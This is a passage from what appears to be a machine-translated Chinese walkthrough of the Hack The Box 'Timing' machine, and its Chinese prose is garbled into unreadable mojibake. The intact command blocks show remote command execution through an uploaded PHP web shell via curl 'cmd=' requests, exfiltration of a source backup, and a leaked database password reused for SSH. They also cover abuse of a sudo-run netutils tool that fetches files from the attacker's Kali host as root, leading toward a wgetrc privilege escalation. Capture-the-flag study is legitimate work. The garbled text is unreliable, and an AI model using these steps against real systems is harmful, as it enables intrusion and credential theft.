ä¸­æå–ä¸€è¡Œï¼Œå¹¶ç”¨æˆ‘çš„Kali boxä¸Šçš„å½“å‰æ—¶é—´æ›¿æ¢time()ã€‚ç„¶åæ·»åŠ æˆ‘ä»¬åˆ›å»ºçš„å°†ç”¨äºå‘½ä»¤æ‰§è¡Œçš„æ–‡ä»¶çš„åç§°ã€‚ç”Ÿæˆçš„æ–‡ä»¶åæ˜¯æˆ‘ä»¬ä¸Šä¼ åéœ€è¦ä½¿ç”¨çš„ã€‚</p><p id="a7ea" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è®©æˆ‘ä»¬æ¥çœŸçš„å§ã€‚è¿”å›ä¸Šä¼ è¡¨å•å¹¶é€‰æ‹©æˆ‘ä»¬çš„web shell:</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div class="gh gi ne"><img src="../Images/7983d95f76b58443ada816888f01c9fe.png" data-original-src="https://miro.medium.com/v2/resize:fit:860/format:webp/0*m4JyrxPHu__5NZop.png"/></div><figcaption class="ls lt gj gh gi lu lv bd b be z dk translated">ä¸Šä¼ å›¾åƒ</figcaption></figure><p id="1908" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç¡®ä¿æ‚¨çš„æµè§ˆå™¨è®¾ç½®ä¸ºä½¿ç”¨Burpä½œä¸ºä»£ç†ï¼Œå¹¶ä¸”è¯¥Burpè®¾ç½®ä¸ºæ‹¦æˆªã€‚ç‚¹å‡»ä¸Šä¼ å›¾åƒæŒ‰é’®ï¼Œç„¶ååˆ‡æ¢åˆ°æ‰“å—ï¼Œçœ‹çœ‹å®ƒè¢«æ‹¦æˆª:</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi nf"><img src="../Images/509b2084827091f4bcd33a4b6f3ed4fe.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*3gCrvFv3BjN2RDF7.png"/></div></div><figcaption class="ls lt gj gh gi lu lv bd b be z dk translated">æ‰“å—æ‹¦æˆªå›¾åƒä¸Šä¼ </figcaption></figure><p id="1d03" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘ä»¬å¯ä»¥åœ¨åº•éƒ¨çœ‹åˆ°æˆ‘ä»¬çš„ä»£ç æ˜¯å®Œæ•´çš„ã€‚å³é”®å•å‡»å¹¶é€‰æ‹©å‘é€åˆ°ä¸­ç»§å™¨ï¼Œç„¶ååˆ‡æ¢åˆ°ä¸­ç»§å™¨é€‰é¡¹å¡å¹¶å•å‡»å‘é€:</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi ng"><img src="../Images/edb095e9b238767de12f9a9a70f664e2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*SgFFsRtc05TKdik8.png"/></div></div><figcaption class="ls lt gj gh gi lu lv bd b be z dk translated">æ‰“å—é‡å¤æ˜¾ç¤ºæ–‡ä»¶ä¸Šä¼ çš„æ—¥æœŸå’Œæ—¶é—´</figcaption></figure><p id="37bd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘ä»¬åœ¨å³ä¾§çœ‹åˆ°æ–‡ä»¶å·²ä¸Šä¼ ï¼Œç°åœ¨å¤åˆ¶å¹¶è®°ä¸‹æœåŠ¡å™¨å“åº”ä¸Šçš„æ—¥æœŸå’Œæ—¶é—´:</p><pre class="ll lm ln lo gt mp mq mr ms aw mt bi"><span id="570a" class="mu kn iq mq b gy mv mw l mx my">Wed, 22 Dec 2021 17:21:43 GMT</span></pre><p id="5fbf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘ä»¬åƒä»¥å‰ä¸€æ ·åœ¨PHPä¸­ä½¿ç”¨å®ƒ:</p><pre class="ll lm ln lo gt mp mq mr ms aw mt bi"><span id="470d" class="mu kn iq mq b gy mv mw l mx my">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/timing]<br/>â””â”€# php -a<br/>Interactive mode enabled<br/>php &gt; echo (md5('$file_hash' . strtotime('Wed, 22 Dec 2021 17:21:43 GMT')) . '_pencer.jpg');<br/>e087b23f34a4f7d6c841db302e7d88ca_pencer.jpg</span></pre><h1 id="b682" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">è¿œç¨‹ä»£ç æ‰§è¡Œ</h1><p id="4e40" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">æˆ‘ä»¬ç°åœ¨æœ‰äº†å¯ä»¥ä½¿ç”¨curlè¿œç¨‹è°ƒç”¨çš„æ–‡ä»¶åã€‚è®©æˆ‘ä»¬ç”¨whoamiæ¥æµ‹è¯•ä¸€ä¸‹:</p><pre class="ll lm ln lo gt mp mq mr ms aw mt bi"><span id="d068" class="mu kn iq mq b gy mv mw l mx my">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/timing]<br/>â””â”€# curl 'http://timing.htb/image.php?img=images/uploads/e087b23f34a4f7d6c841db302e7d88ca_pencer.jpg&amp;cmd=whoami'<br/>www-data</span></pre><p id="1ff1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">é‚£è¡Œå¾—é€šã€‚ç„¶è€Œï¼Œæˆ‘èŠ±äº†å¾ˆé•¿æ—¶é—´è¯•å›¾å¾—åˆ°ä¸€ä¸ªåå‘å£³æ²¡æœ‰è¿æ°”ã€‚å›åˆ°æšä¸¾æ–‡ä»¶ç³»ç»Ÿï¼Œæœ€ç»ˆæˆ‘æ‰¾åˆ°äº†è¿™ä¸ª:</p><pre class="ll lm ln lo gt mp mq mr ms aw mt bi"><span id="9711" class="mu kn iq mq b gy mv mw l mx my">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/timing]<br/>â””â”€# curl 'http://timing.htb/image.php?img=images/uploads/e087b23f34a4f7d6c841db302e7d88ca_pencer.jpg&amp;cmd=ls+-lsa+/opt' <br/>total 624<br/>616 -rw-r--r--  1 root root 627851 Jul 20 22:36 source-files-backup.zip</span></pre><p id="aa53" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ä¸€ä¸ªå¤‡ä»½æ–‡ä»¶ï¼Œæˆ‘ä»¬ä¸€å®šè¦çœ‹çœ‹ã€‚é¦–å…ˆå°†å…¶å¤åˆ¶åˆ°æˆ‘ä»¬æœ‰æƒè®¿é—®çš„ä¸Šä¼ æ–‡ä»¶å¤¹:</p><pre class="ll lm ln lo gt mp mq mr ms aw mt bi"><span id="5515" class="mu kn iq mq b gy mv mw l mx my">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/timing]<br/>â””â”€# curl 'http://timing.htb/image.php?img=images/uploads/e087b23f34a4f7d6c841db302e7d88ca_pencer.jpg&amp;cmd=cp+/opt/source-files-backup.zip+/var/www/html/images/uploads/'</span></pre><p id="8854" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç°åœ¨æˆ‘ä»¬å¯ä»¥ä¸‹è½½äº†:</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi nh"><img src="../Images/a6e19e582c8408d256661361141c5c97.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*6nC_lupU4z63mo5p5HyGTg.png"/></div></div><figcaption class="ls lt gj gh gi lu lv bd b be z dk translated">ä½¿ç”¨curlä¸‹è½½backup.zip</figcaption></figure><h1 id="62a0" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">å¤‡ä»½æ–‡ä»¶æ¢ç´¢</h1><p id="b5f0" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">æ‹‰å¼€æ‹‰é“¾çœ‹çœ‹:</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi ni"><img src="../Images/c5b23a584c093d646cdc3a345223d83e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*iewntDlcSvqVNtKnGmzy7w.png"/></div></div><figcaption class="ls lt gj gh gi lu lv bd b be z dk translated">è§£å‹ç¼©å¤‡ä»½æ–‡ä»¶</figcaption></figure><p id="5b5f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æµè§ˆè¿™äº›æ–‡ä»¶ï¼Œæˆ‘ä»¬åœ¨db_conn.phpä¸­å‘ç°äº†ä¸€äº›æœ‰è¶£çš„ä¸œè¥¿:</p><pre class="ll lm ln lo gt mp mq mr ms aw mt bi"><span id="b08b" class="mu kn iq mq b gy mv mw l mx my">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/timing/backup]<br/>â””â”€# cat db_conn.php                  <br/>&lt;?php<br/>$pdo = new PDO('mysql:host=localhost;dbname=app', 'root', '4_V3Ry_l0000n9_p422w0rd');</span></pre><p id="9e88" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">aaronæ˜¯å¦é‡å¤ä½¿ç”¨äº†mysqlå¯†ç è¿›è¡Œsshè®¿é—®:</p><pre class="ll lm ln lo gt mp mq mr ms aw mt bi"><span id="0dc2" class="mu kn iq mq b gy mv mw l mx my">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/timing/extracted]<br/>â””â”€# ssh aaron@timing.htb<br/>aaron@timing.htb's password: <br/>Permission denied, please try again.</span></pre><p id="aea4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å¥½å§ï¼Œé‚£æ²¡ç”¨ã€‚ä½†æ˜¯ï¼Œè¿›ä¸€æ­¥æŸ¥çœ‹å¤‡ä»½æ–‡ä»¶ï¼Œæˆ‘ä»¬ä¼šå‘ç°æœ‰ä¸€ä¸ªGitå­˜å‚¨åº“ã€‚å¥½åƒæœ‰ç‚¹å¯ç–‘ï¼</p><h1 id="7976" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">GitTools</h1><p id="5299" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">è®©æˆ‘ä»¬åƒåœ¨<a class="ae kl" href="https://www.hackthebox.com/home/machines/profile/398" rel="noopener ugc nofollow" target="_blank"> Devzat </a>ä¸Šä¸€æ ·ä½¿ç”¨GitToolså¹¶æå–æºæ–‡ä»¶ã€‚å¦‚æœéœ€è¦ï¼Œè¯·ä¸‹è½½å®ƒä»¬:</p><pre class="ll lm ln lo gt mp mq mr ms aw mt bi"><span id="563e" class="mu kn iq mq b gy mv mw l mx my">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/devzat]<br/>â””â”€# git clone https://github.com/internetwache/GitTools.git<br/>Cloning into 'GitTools'...<br/>remote: Enumerating objects: 229, done.<br/>remote: Counting objects: 100% (20/20), done.<br/>remote: Compressing objects: 100% (16/16), done.<br/>remote: Total 229 (delta 6), reused 7 (delta 2), pack-reused 209<br/>Receiving objects: 100% (229/229), 52.92 KiB | 1.65 MiB/s, done.<br/>Resolving deltas: 100% (85/85), done.</span></pre><p id="7fb1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å¯¹å¤‡ä»½æ–‡ä»¶å¤¹ä½¿ç”¨æå–ç¨‹åºè„šæœ¬:</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi nj"><img src="../Images/994fb904841a79fc3f30d1b26e037103.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*P_JgXDsBK16b3CIta2G7gg.png"/></div></div><figcaption class="ls lt gj gh gi lu lv bd b be z dk translated">ä½¿ç”¨GitToolsæå–gitæ¡£æ¡ˆ</figcaption></figure><p id="fd23" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç°åœ¨çœ‹çœ‹æå–å™¨æ–‡ä»¶:</p><pre class="ll lm ln lo gt mp mq mr ms aw mt bi"><span id="bbfe" class="mu kn iq mq b gy mv mw l mx my">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/timing]<br/>â””â”€# ll extracted <br/>drwxr-xr-x 5 root root 4096 Dec 22 17:43 0-16de2698b5b122c93461298eab730d00273bd83e<br/>drwxr-xr-x 5 root root 4096 Dec 22 17:43 1-e4e214696159a25c69812571c8214d2bf8736a3f</span></pre><p id="1d29" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æœ‰ä¸¤ä¸ªæäº¤ã€‚å°±åƒæˆ‘ä»¬åœ¨Devzatä¸Šåšçš„ä¸€æ ·ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨diffä½œä¸ºä¸€ç§ç®€å•çš„æ–¹æ³•æ¥æŸ¥çœ‹æäº¤ä¹‹é—´å‘ç”Ÿäº†ä»€ä¹ˆå˜åŒ–:</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi nk"><img src="../Images/af5dc98107ea2f52a21f89afb5fc385d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*jVd9HzTisSen3NqQr7puxQ.png"/></div></div><figcaption class="ls lt gj gh gi lu lv bd b be z dk translated">ä½¿ç”¨diffæ£€æŸ¥æ–‡ä»¶å¤¹ä¹‹é—´çš„æ›´æ”¹</figcaption></figure><h1 id="9169" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">å®‹æ‰¿å®ªé¥°æ¼”äºšä¼¦</h1><p id="4d25" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">å”¯ä¸€çš„å˜åŒ–æ˜¯æˆ‘ä»¬ä¹‹å‰ç”¨aaronåœ¨SSHä¸Šå°è¯•çš„db_conn.phpæ–‡ä»¶ä¸­çš„å¯†ç ã€‚è®©æˆ‘ä»¬è¯•è¯•è¿™ä¸ª:</p><pre class="ll lm ln lo gt mp mq mr ms aw mt bi"><span id="555f" class="mu kn iq mq b gy mv mw l mx my">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/timing/extracted]<br/>â””â”€# ssh aaron@timing.htb<br/>aaron@timing.htb's password: <br/>Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-147-generic x86_64)<br/><br/>  System information as of Wed Dec 22 17:45:49 UTC 2021<br/><br/>Last login: Wed Dec 22 17:41:31 2021 from 10.10.14.124<br/>aaron@timing:~$</span></pre><p id="2e70" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å¥½å§ï¼Œæˆ‘ä»¬çŸ¥é“è¿™æ˜¯å¯è¡Œçš„ï¼Œä¸æ˜¯å—ï¼</p><h1 id="4cf6" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">Sudoæƒé™</h1><p id="c38f" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">åƒå¾€å¸¸ä¸€æ ·ï¼Œåœ¨ä½¿ç”¨LinPEASä¹‹ç±»çš„ä¸œè¥¿ä¹‹å‰ï¼Œæ£€æŸ¥å‡ ä¸ªæ˜æ˜¾çš„ä¸œè¥¿ã€‚åœ¨è¿™é‡Œï¼Œæˆ‘ä»sudoå¼€å§‹ï¼Œè¿™æ˜¯æ­£ç¡®çš„åœ°æ–¹:</p><pre class="ll lm ln lo gt mp mq mr ms aw mt bi"><span id="ae16" class="mu kn iq mq b gy mv mw l mx my">aaron@timing:~$ sudo -l<br/>Matching Defaults entries for aaron on timing:<br/>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br/><br/>User aaron may run the following commands on timing:<br/>    (ALL) NOPASSWD: /usr/bin/netutils</span></pre><h1 id="c396" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">æ˜“å—æ”»å‡»çš„Javaåº”ç”¨ç¨‹åº</h1><p id="589e" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">ä»€ä¹ˆæ˜¯netutils:</p><pre class="ll lm ln lo gt mp mq mr ms aw mt bi"><span id="e045" class="mu kn iq mq b gy mv mw l mx my">aaron@timing:~$ file /usr/bin/netutils<br/>/usr/bin/netutils: Bourne-Again shell script, ASCII text executable<br/><br/>aaron@timing:~$ cat /usr/bin/netutils<br/>#! /bin/bash<br/>java -jar /root/netutils.jar</span></pre><p id="9856" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è¿™ä¸ªshellè„šæœ¬åœ¨æ ¹æ–‡ä»¶å¤¹ä¸­è¿è¡Œä¸€ä¸ªJavaåº”ç”¨ç¨‹åºï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æ²¡æœ‰å¯†ç çš„æƒ…å†µä¸‹ä»¥rootèº«ä»½è¿è¡Œå®ƒã€‚å¬èµ·æ¥å¾ˆæœ‰è¶£ï¼Œè®©æˆ‘ä»¬çœ‹çœ‹å®ƒæœ‰ä»€ä¹ˆä½œç”¨:</p><pre class="ll lm ln lo gt mp mq mr ms aw mt bi"><span id="b703" class="mu kn iq mq b gy mv mw l mx my">aaron@timing:~$ sudo /usr/bin/netutils<br/>netutils v0.1<br/>Select one option:<br/>[0] FTP<br/>[1] HTTP<br/>[2] Quit<br/>Input &gt;&gt;</span></pre><p id="388f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è¿™ä¸ªutilæœ‰ä¸¤ä¸ªé€‰é¡¹ï¼ŒFTPæˆ–HTTPï¼Œæ— è®ºä½ é€‰æ‹©å“ªä¸ªï¼Œç„¶åè¦æ±‚ä¸€ä¸ªæ–‡ä»¶ã€‚è¿™å¯ä»¥è¿œç¨‹æ‰˜ç®¡ï¼Œæ‰€ä»¥è®©æˆ‘ä»¬å…ˆåœ¨Kaliä¸Šå¯åŠ¨ä¸€ä¸ªwebæœåŠ¡å™¨:</p><pre class="ll lm ln lo gt mp mq mr ms aw mt bi"><span id="5565" class="mu kn iq mq b gy mv mw l mx my">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/timing]<br/>â””â”€# python3 -m http.server 80</span></pre><p id="9cf8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç°åœ¨åˆ‡æ¢å›ç›’å­ï¼Œè¯•ç€ä»Kalié‚£é‡Œè·å–ä¸€ä¸ªæ–‡ä»¶:</p><pre class="ll lm ln lo gt mp mq mr ms aw mt bi"><span id="3c78" class="mu kn iq mq b gy mv mw l mx my">netutils v0.1<br/>Select one option:<br/>[0] FTP<br/>[1] HTTP<br/>[2] Quit<br/>Input &gt;&gt; 0<br/>Enter Url+File: 10.10.14.12/pencer.jpg</span></pre><p id="5cb6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘è¯•ç€æŠ“å–æˆ‘ä»¬ä¹‹å‰ç”¨FTPåˆ¶ä½œçš„å‡jpgï¼Œä½†æ˜¯ä»€ä¹ˆä¹Ÿæ²¡å‘ç”Ÿã€‚åœ¨Kaliä¸Šæ£€æŸ¥æˆ‘çš„ç½‘ç»œæœåŠ¡å™¨ï¼Œæ²¡æœ‰è¿æ¥å°è¯•ã€‚æˆ‘ä»¬è¯•è¯•http:</p><pre class="ll lm ln lo gt mp mq mr ms aw mt bi"><span id="298c" class="mu kn iq mq b gy mv mw l mx my">netutils v0.1<br/>Select one option:<br/>[0] FTP<br/>[1] HTTP<br/>[2] Quit<br/>Input &gt;&gt; 1<br/>Enter Url: http://10.10.14.12/pencer.jpg<br/>Initializing download: http://10.10.14.12/pencer.jpg<br/>File size: 28 bytes<br/>Opening output file pencer.jpg<br/>Server unsupported, starting from scratch with one connection.<br/>Starting download<br/>Downloaded 28 byte in 0 seconds. (0.27 KB/s)</span></pre><p id="9090" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è¿™çœ‹èµ·æ¥æ›´æœ‰å¸Œæœ›ã€‚åœ¨Kaliä¸Šæ£€æŸ¥æˆ‘ä»¬çš„ç½‘ç»œæœåŠ¡å™¨ï¼Œæˆ‘çœ‹åˆ°ä¸€ä¸ªæ¥è‡ªç›’å­çš„è¿æ¥ï¼Œå¹¶ä¸”æ–‡ä»¶è¢«å–å›ã€‚åœ¨æœ¬åœ°æŸ¥çœ‹ï¼Œæˆ‘çœ‹åˆ°è¯¥æ–‡ä»¶åœ¨é‚£é‡Œï¼Œå®ƒç”±rootæ‰€æœ‰ã€‚</p><h1 id="86a9" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">Pspy64</h1><p id="ec45" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">æˆ‘ä»¬å¯ä»¥ä½¿ç”¨wgetè·å–ä¸€ä¸ªæ–‡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å‡è®¾è¿™ä¸ªutilä¸­æœ‰ä¸€ä¸ªæˆ‘ä»¬éœ€è¦åˆ©ç”¨çš„æ¼æ´ã€‚ä¸ºäº†ç†è§£å®ƒæ˜¯å¦‚ä½•å·¥ä½œçš„ï¼Œè®©æˆ‘ä»¬ä½¿ç”¨pspy64ï¼Œå°±åƒæˆ‘ä»¬åœ¨å…¶ä»–è®¸å¤šæ—¶å€™åšçš„é‚£æ ·ï¼Œæœ€è¿‘æ˜¯åœ¨<a class="ae kl" href="https://app.hackthebox.com/machines/355" rel="noopener ugc nofollow" target="_blank"> Static </a>ä¸Šã€‚å¦‚æœä½ è¿˜æ²¡æœ‰ä»<a class="ae kl" href="https://github.com/DominicBreuker/pspy" rel="noopener ugc nofollow" target="_blank">è¿™é‡Œ</a>æŠ“å–ï¼Œæˆ‘å·²ç»æœ‰äº†ï¼Œæ‰€ä»¥åªéœ€è¦æŠŠå®ƒå¤åˆ¶åˆ°æˆ‘åœ¨Kaliä¸Šè¿è¡Œçš„webæœåŠ¡å™¨çš„è·¯å¾„ä¸Š:</p><pre class="ll lm ln lo gt mp mq mr ms aw mt bi"><span id="b5c1" class="mu kn iq mq b gy mv mw l mx my">â”Œâ”€â”€(rootğŸ’€kali)-[~]<br/>â””â”€# locate pspy64<br/>/root/htb/static/pspy64<br/><br/>â”Œâ”€â”€(rootğŸ’€kali)-[~]<br/>â””â”€# cd htb/timing<br/><br/>â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/timing]<br/>â””â”€# cp /root/htb/static/pspy64 .</span></pre><p id="067c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç°åœ¨å›åˆ°ç›’å­ä¸Šï¼ŒæŠŠpspy64æ‹‰è¿‡æ¥ï¼Œå¼€å§‹è¿è½¬:</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi nl"><img src="../Images/7f078e6a3da84ebd46d1e0eaa2ed99c4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*4345YFcxufb5g_wENcM_6A.png"/></div></div><figcaption class="ls lt gj gh gi lu lv bd b be z dk translated">Pspyåœ¨ç›’å­ä¸Šè¿è¡Œ</figcaption></figure><p id="74d9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">åœ¨æˆ‘ä»¬å½“å‰çš„SSHä¼šè¯ä¸­è¿è¡Œï¼Œç™»å½•åˆ°ç¬¬äºŒä¸ªä¼šè¯ï¼Œç„¶åå†æ¬¡è¿è¡Œnetutilsã€‚åƒä»¥å‰ä¸€æ ·ï¼Œå¯¹FTPä½¿ç”¨é€‰é¡¹0ï¼Œå¯¹HTTPä½¿ç”¨é€‰é¡¹1ï¼Œå†æ¬¡å°è¯•è·å–æˆ‘çš„pencer.jpgæ–‡ä»¶ã€‚ç°åœ¨åˆ‡æ¢å›pspy64ä¼šè¯ï¼Œçœ‹çœ‹å‘ç”Ÿäº†ä»€ä¹ˆ:</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi nl"><img src="../Images/091eb655470cea31bc7d5ef3697ebed4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1z1AJ3E2nk76_S6KQs3HrA.png"/></div></div><figcaption class="ls lt gj gh gi lu lv bd b be z dk translated">Pspyæ˜¾ç¤ºæ­£åœ¨ä½¿ç”¨wget</figcaption></figure><h1 id="fb33" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">Wgetæ¼æ´åˆ©ç”¨</h1><p id="d444" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">æˆ‘ä»¬å¯ä»¥çœ‹åˆ°netutils javaåº”ç”¨ç¨‹åºä½¿ç”¨wgetè¿›è¡ŒFTPè¿æ¥ï¼Œä½¿ç”¨axelè¿›è¡ŒHTTPè¿æ¥ã€‚æˆ‘åæ¥å‘ç°é€šè¿‡åˆ©ç”¨axelæ¥å®Œæˆè¿™ä¸ªç›’å­æ˜¯å¯èƒ½çš„ï¼Œä½†æ˜¯æˆ‘æ˜¯ä½¿ç”¨FTPæ¥å®Œæˆçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å°†éµå¾ªé‚£ä¸ªæ–¹æ³•ã€‚</p><p id="ea43" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è¿˜æœ‰å¦ä¸€ä¸ªå«Kotarakçš„HTBç›’å­ä¹Ÿæœ‰ç±»ä¼¼çš„è·¯å¾„ï¼Œ<a class="ae kl" href="https://0xdf.gitlab.io/2021/05/19/htb-kotarak.html" rel="noopener ugc nofollow" target="_blank">è¿™ä¸ª</a>èµ°è¿‡å¸®åŠ©äº†æˆ‘ã€‚éœ€è¦çŸ¥é“çš„å…³é”®éƒ¨åˆ†æ˜¯wgetåœ¨è¿è¡Œæ—¶ä¼šå¯»æ‰¾ä¸€ä¸ªå¯åŠ¨æ–‡ä»¶ã€‚ä»è¿™é‡Œçš„æ–‡æ¡£<a class="ae kl" href="https://www.gnu.org/software/wget/manual/html_node/Wgetrc-Location.html" rel="noopener ugc nofollow" target="_blank">æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å®ƒæ˜¯å¦‚ä½•å·¥ä½œçš„:</a></p><pre class="ll lm ln lo gt mp mq mr ms aw mt bi"><span id="d33f" class="mu kn iq mq b gy mv mw l mx my">When initializing, Wget will look for a global startup file, /usr/local/etc/wgetrc by default (or some prefix other than /usr/local, if Wget was not installed there) and read commands from there, if it exists.<br/><br/>Then it will look for the userâ€™s file. If the environmental variable WGETRC is set, Wget will try to load that file. Failing that, no further attempts will be made.<br/><br/>If WGETRC is not set, Wget will try to load $HOME/.wgetrc.</span></pre><p id="1827" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">åœ¨è¿™ä¸ªç›’å­ä¸Šï¼Œæˆ‘ä»¬å‘ç°æ²¡æœ‰å…¨å±€æ–‡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡åˆ›å»ºæˆ‘ä»¬è‡ªå·±çš„æ–‡ä»¶æ¥åˆ©ç”¨å®ƒã€‚aaronçš„/homeæ–‡ä»¶å¤¹ä¸­çš„wgetrcæ–‡ä»¶ã€‚æŸ¥çœ‹å¯ç”¨çš„å‘½ä»¤<a class="ae 